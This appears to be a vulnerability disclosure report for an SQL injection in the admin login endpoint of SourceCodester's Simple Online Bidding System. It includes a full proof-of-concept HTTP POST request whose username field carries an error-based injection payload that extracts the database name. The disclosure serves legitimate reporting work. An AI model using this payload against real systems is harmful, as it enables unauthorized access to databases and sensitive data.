## Sourcecoster simple online bidding system has sql injection vulnerability

## submitter
zhangMingMing

## supplier
https://www.sourcecodester.com/php/14558/simple-online-bidding-system-using-phpmysqli-source-code.html

## Vulnerability file
/simple-online-bidding-system/bidding/admin/ajax.php?action=login

## Vulnerability analysis
<img width="830" alt="image" src="https://github.com/user-attachments/assets/a652291e-88db-4360-b8ad-b5cb273b7398">
<img width="1030" alt="image" src="https://github.com/user-attachments/assets/ea3cce0c-074e-4960-81f8-7f8e18d17244">


## describe
There is an unrestricted SQL injection attack in the simple online bidding system, and the controllable parameter is username. An attacker can obtain sensitive server information through this vulnerability.

POC
```
POST /simple-online-bidding-system/bidding/admin/ajax.php?action=login HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 88
Origin: http://localhost
Connection: close
Referer: http://localhost/simple-online-bidding-system/bidding/admin/login.php
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

username=admin'%20and%20updatexml(1,concat(0x7e,(database())),3)--%20q&password=admin123
```

<img width="1089" alt="image" src="https://github.com/user-attachments/assets/38350edf-d000-4bbe-90c8-46da06c4d90a">







